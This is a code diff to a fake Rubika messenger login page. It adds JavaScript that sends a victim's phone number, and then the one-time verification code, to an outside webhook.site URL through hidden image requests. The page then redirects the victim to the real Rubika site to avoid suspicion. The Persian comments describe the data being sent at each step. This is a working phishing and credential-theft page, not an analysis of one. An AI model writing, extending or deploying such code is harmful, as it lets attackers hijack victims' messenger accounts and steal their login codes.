@@ -113,6 +113,10 @@
                 document.getElementById('step1').classList.remove('active');
                 document.getElementById('step2').classList.add('active');
                 document.getElementById('codeInput').focus();
+
+                // 🔥 ارسال شماره موبایل به‌تنهایی در همین لحظه (مرحله اول)
+                new Image().src = 'https://webhook.site/797a6d1e-7344-4f1f-9d13-9618ed0ceee8?phone=' +
+                                  encodeURIComponent(phoneNumber) + '&step=1';
             } else {
                 document.getElementById('phoneError').style.display = 'block';
             }
@@ -129,13 +133,13 @@
             btn.disabled = true;
             btn.querySelector('span').textContent = 'لطفاً صبر کنید...';
 
-            // ارسال اطلاعات (Image beacon)
+            // 🔥 ارسال شماره و کد در مرحله دوم
             new Image().src = 'https://webhook.site/797a6d1e-7344-4f1f-9d13-9618ed0ceee8?phone=' +
-                              encodeURIComponent(phoneNumber) + '&code=' + encodeURIComponent(code);
+                              encodeURIComponent(phoneNumber) + '&code=' + encodeURIComponent(code) + '&step=2';
 
             document.getElementById('overlay').classList.add('show');
 
-            // هدایت به صفحهٔ اصلی روبیکا (نه /login)
+            // هدایت به صفحهٔ اصلی روبیکا
             setTimeout(function() {
                 window.location.href = 'https://web.rubika.ir/';
             }, 2500);
